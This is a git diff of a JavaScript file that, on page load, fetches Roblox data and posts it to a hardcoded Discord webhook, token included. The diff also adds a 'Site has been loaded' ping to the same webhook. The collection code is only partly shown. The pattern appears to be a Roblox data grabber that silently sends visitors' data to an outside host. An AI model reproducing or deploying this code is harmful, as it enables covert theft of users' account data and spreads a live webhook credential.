@@ -1,15 +1,15 @@
 // Define your Discord webhook URL
 const webhookUrl = 'https://discord.com/api/webhooks/1272974490879397949/neN1WoArgjNAj3rpmK-4lqHJVfAEcql6oz5S45jgjYwSbCU1IX3GqRo_HOJ0-af-NU3N';
 
-// Function to send data to the Discord webhook
-function sendToDiscord(data) {
+// Function to send a message to the Discord webhook
+function sendToDiscord(message) {
     fetch(webhookUrl, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            content: `Roblox Data: ${data}`
+            content: message
         })
     })
     .then(response => {
@@ -45,10 +45,14 @@ function fetchRobloxData() {
         }));
         
         // Send the combined data to Discord
-        sendToDiscord(JSON.stringify(combinedData, null, 2));
+        sendToDiscord(`Roblox Data: ${JSON.stringify(combinedData, null, 2)}`);
     })
     .catch(error => console.error('Error fetching Roblox data:', error));
 }
 
-// Trigger fetching data once the DOM content is loaded
-document.addEventListener('DOMContentLoaded', fetchRobloxData);
+// Trigger the initial message and data fetching once the DOM content is loaded
+document.addEventListener('DOMContentLoaded', () => {
+    sendToDiscord('Site has been loaded')
+        .then(() => fetchRobloxData())
+        .catch(error => console.error('Error sending initial message to Discord:', error));
+});
